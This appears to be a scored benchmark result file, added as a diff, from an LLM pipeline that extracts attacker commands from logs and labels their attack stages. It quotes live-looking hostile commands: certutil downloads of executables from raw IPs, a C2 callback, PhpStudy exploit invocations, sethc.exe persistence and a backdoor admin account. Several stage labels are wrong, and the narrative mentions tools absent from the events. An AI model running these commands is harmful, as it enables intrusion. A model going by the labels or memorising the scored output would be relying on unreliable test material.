@@ -1,0 +1,107 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "taskkill /f /im agent.exe",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "cmd.exe /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "python PhpStudyPoc.py http://121.36.30.176/",
+        "stage": "Discovery"
+      },
+      {
+        "command": "del /f /q PhpStudyPoc.py",
+        "stage": "Collection"
+      },
+      {
+        "command": "python PhpStudyExp2.py http://121.36.30.176/ \"whoami&arp -a&ipconfig&ping www.baidu.com -c 1\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "del /f /q PhpStudyExp2.py",
+        "stage": "Collection"
+      },
+      {
+        "command": "Reg ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\\/f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "net user nbb nb123. /add",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "net localgroup administrators nbb /add",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "C:\\Windows\\ywm.exe",
+        "stage": "Execution"
+      }
+    ],
+    "narrative": "The attackers started by downloading malware binaries onto the victim machine using tools like CertUtil and Python scripts. They also executed commands to create new users, grant administrative privileges to those users, and modify registry entries to allow remote desktop access without authentication. The attackers then downloaded additional tools such as NBTScan and PAexec.exe, which were likely used to enumerate the network and execute commands remotely. Finally, they deleted some of their own files to cover their tracks.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 34257,
+      "completion_tokens": 1920,
+      "total_tokens": 36177,
+      "wall_clock_s": 11.593,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.2857142857142857,
+      "recall": 0.5714285714285714,
+      "f1": 0.38095238095238093,
+      "tp": 4,
+      "fp": 10,
+      "fn": 3
+    },
+    "stage": {
+      "precision": 0.14285714285714285,
+      "recall": 0.3333333333333333,
+      "f1": 0.2,
+      "tp": 2,
+      "fp": 12,
+      "fn": 4,
+      "recall_partial": 0.4166666666666667
+    },
+    "hallucination_rate": 0.07142857142857142,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 34257,
+      "completion_tokens": 1920,
+      "total_tokens": 36177,
+      "wall_clock_s": 11.593,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
